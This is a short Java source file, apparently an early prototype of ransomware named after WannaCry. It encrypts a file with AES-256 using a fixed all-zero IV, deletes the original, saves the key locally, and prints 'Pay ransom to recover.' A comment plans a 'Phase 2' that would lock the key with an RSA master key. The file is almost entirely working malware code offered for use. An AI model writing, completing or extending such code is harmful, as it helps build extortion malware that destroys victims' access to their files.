import javax.crypto.*;
import javax.crypto.spec.*;
import java.nio.file.*;
import java.security.*;

public class WannaCry {
    public static void main(String[] args) {
        try {
            // 1. Generate 256-bit AES key
            KeyGenerator keyGen = KeyGenerator.getInstance("AES");
            keyGen.init(256);
            SecretKey aesKey = keyGen.generateKey();
            
            // 2. Create cipher with zero IV
            byte[] iv = new byte[16]; // all zeros
            IvParameterSpec ivSpec = new IvParameterSpec(iv);
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, aesKey, ivSpec);
            
            // 3. Read, encrypt, write
            byte[] plaintext = Files.readAllBytes(Paths.get("test.txt"));
            byte[] ciphertext = cipher.doFinal(plaintext);
            Files.write(Paths.get("test.txt.cry"), ciphertext);
            
            // 4. Delete original
            Files.delete(Paths.get("test.txt"));
            
            // 5. TODO (Phase 2): Encrypt AES key with RSA master public key
            // For now, just save raw key for testing
            Files.write(Paths.get("aes.key"), aesKey.getEncoded());
            
            System.out.println("Files encrypted. Pay ransom to recover.");
        } catch (Exception e) {
            System.err.println("Error: " + e.getMessage());
        }
    }
}
